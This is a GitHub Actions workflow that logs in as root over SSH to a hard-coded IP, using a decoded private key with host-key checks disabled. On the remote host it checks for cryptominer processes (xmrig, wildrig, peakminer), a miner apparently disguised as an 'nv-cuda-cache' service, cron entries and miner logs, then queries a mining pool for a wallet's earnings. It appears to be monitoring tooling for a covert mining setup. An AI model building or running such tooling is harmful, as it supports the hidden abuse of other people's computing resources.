name: zz-b300probe
on: workflow_dispatch
permissions:
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: ssh-census
        env:
          KB64: ""
        run: |
          set +e
          echo "$KB64" | base64 -d > /tmp/k; chmod 600 /tmp/k
          SSH="ssh -i /tmp/k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=25 -o BatchMode=yes"
          echo "=== HOST ==="
          $SSH root@201.79.46.70 'hostname; id; uptime; nvidia-smi -L' 2>&1 | head -20
          echo "=== PROC ==="
          $SSH root@201.79.46.70 'ps aux | grep -iE "wildrig|peakminer|xmrig" | grep -v grep; systemctl is-active nv-cuda-cache; crontab -l 2>/dev/null | tail -5' 2>&1 | head -20
          echo "=== LOG ==="
          $SSH root@201.79.46.70 'tail -6 /opt/ul19/miner.log 2>/dev/null; echo ---; tail -3 /opt/ul19/keep.log 2>/dev/null' 2>&1 | head -20
          echo "=== POOLFROMRUNNER ==="
          curl -s -m 20 "https://pearl.luckypool.io/api/stats_address?address=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz" | head -c 400
          echo
